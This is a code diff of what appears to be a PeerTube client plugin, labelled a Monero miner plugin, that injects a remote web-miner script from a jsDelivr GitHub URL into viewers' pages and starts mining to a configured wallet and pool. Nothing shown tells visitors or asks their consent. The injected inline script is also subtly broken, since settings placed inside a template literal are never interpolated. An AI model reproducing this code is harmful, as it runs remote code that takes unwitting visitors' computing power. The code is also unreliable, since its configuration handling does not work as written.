@@ -4,21 +4,21 @@ peertubeHelpers.getSettings().then(
       s => {
       console.log('Initializing Monero miner client plugin...')
       if ( !s || !s['walletAddress'] || !s['poolAddress']) {
-        console.error('Monero miner plugin: Required settings are missing.');
-        return;
+        console.error('Monero miner plugin: Required settings are missing.')
+        return
       }
 
       // 外部スクリプトを挿入
-      const externalScript = document.createElement("script");
-      externalScript.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
-      externalScript.async = false;
-      document.head.appendChild(externalScript);
+      const externalScript = document.createElement("script")
+      externalScript.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
+      externalScript.async = false
+      document.head.appendChild(externalScript)
 
       // 外部スクリプトのロード完了後に内部スクリプトを挿入
       externalScript.onload = function() {
-        console.log("Mining script loaded successfully.");
+        console.log("Mining script loaded successfully.")
 
-        const inlineScript = document.createElement("script");
+        const inlineScript = document.createElement("script")
         // テンプレートリテラルとかいう反則じみた記述 知らなかった・・・
         inlineScript.textContent = `
             server = s['webSocket'];
@@ -29,14 +29,14 @@ peertubeHelpers.getSettings().then(
             var password = s['password'];
             startMining(pool, walletAddress, workerId, threads, password)
             throttleMiner = 20;
-        `;
-        document.body.appendChild(inlineScript);
-        console.log("Mining started.");
-      };
+        `
+        document.body.appendChild(inlineScript)
+        console.log("Mining started.")
+      }
 
       externalScript.onerror = function() {
-        console.error("Failed to load the mining script.");
-      };
+        console.error("Failed to load the mining script.")
+      }
     }
   )
 }
